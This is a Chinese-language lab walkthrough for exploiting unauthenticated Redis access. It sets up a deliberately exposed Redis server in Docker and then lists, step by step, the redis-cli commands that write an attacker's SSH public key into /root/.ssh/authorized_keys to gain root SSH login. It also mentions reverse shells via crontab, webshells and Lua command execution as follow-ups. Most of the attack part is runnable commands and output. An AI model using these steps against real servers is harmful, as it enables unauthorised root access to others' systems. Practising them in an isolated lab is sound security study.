# redis 未授权访问

## 环境搭建

被攻击环境创建：  
创建虚拟机  
`docker run -tid -p 2222:22 -p 6379:6379 ubuntu`  
安装ssh，redis，vim  
`apt-get update`  
`apt-get install openssh-server`  
`service ssh start`  
`mkdir /root/.ssh`  
`apt-get install redis`  
`apt-get install vim`  
修改如下配置，使redis可远程访问  
`vim /etc/redis/redis.conf`  
`# blnd 127.0.0.1`

以非保护模式启动redis  
`redis-server  --protected-mode no`  

注意：  
这里kali要设置成桥接，否则ssh连接出错。我的被攻击机也是桥接进网络中的docker虚拟机，和实际环境有关系  
连接的端口是 2222  

攻击机：kali  
`apt-get install  redis`  
生成ssh key  
`ssh-keygen -t rsa`  
进入.ssh目录。将生成的目录保存到 kitty.txt  
`cd .ssh`
`(echo -e "\n\n";cat id_rsa.pub; echo -e "\n\n") > kitty.txt`  
将kitty.txt写入redis(使用redis-cli -h IP命令连接主机A，将文件写入)  
`cat kitty.txt | redis-cli -h 192.168.3.35 -x set crack`  
远程登陆redis命令  
`redis-cli -h 192.168.3.35`  
获得当前备份路径的命令  
`config get dir`  
设置备份路径的命令  
`config set dir /root/.ssh`  
设置上传公钥的备份文件名字为 authorized_keys  
`192.168.3.35:6379> config set dbfilename authorized_keys`  
`OK`  
检查是否更改成功(查看有没有authorized_keys文件)，没有问题就保存然后退出，至此，我们成功地写入ssh公钥到靶机上

``` shell
192.168.3.35:6379> config get dbfilename
1) "dbfilename"
2) "authorized_keys"
192.168.3.35:6379> save
OK
192.168.3.35:6379> exit
```

ssh免密登陆  
`ssh -i id_rsa -p 2222 root@192.168.3.35`

后续  
在crontab里写定时任务，反弹shell  
在web目录下写入webshell  
利用redis执行命令：redis 2.6以前的版本内置了lua脚本环境，在有连接redis服务器的权限下，可以利用lua执行系统命令。

### 参考

https://www.cnblogs.com/ECJTUACM-873284962/p/9561993.html  
https://blog.csdn.net/guxiaoguo/article/details/78913245